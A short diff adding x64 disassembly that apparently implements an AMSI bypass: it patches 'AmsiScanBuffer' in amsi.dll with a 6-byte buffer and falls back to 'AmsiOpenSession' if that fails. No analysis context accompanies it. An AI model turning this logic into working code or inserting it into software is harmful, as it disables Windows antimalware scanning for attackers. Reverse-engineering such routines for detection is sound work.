@@ -1,0 +1,18 @@
+sub     rsp, 28h
+lea     r8, unk_140005120; Src
+mov     r9d, 6; dwSize
+lea     rdx, aAmsiscanbuffer; "AmsiScanBuffer"
+lea     rcx, aAmsiDll; "amsi.dll"
+call    sub_1400041A0
+test    eax, eax
+jz      short loc_140002ED0
+loc_140002ec8:
+add     rsp, 28h
+retn
+loc_140002ed0:
+lea     r8, unk_140005120; Src
+mov     r9d, 6; dwSize
+lea     rdx, aAmsiopensessio; "AmsiOpenSession"
+lea     rcx, aAmsiDll; "amsi.dll"
+add     rsp, 28h
+jmp     sub_1400041A0
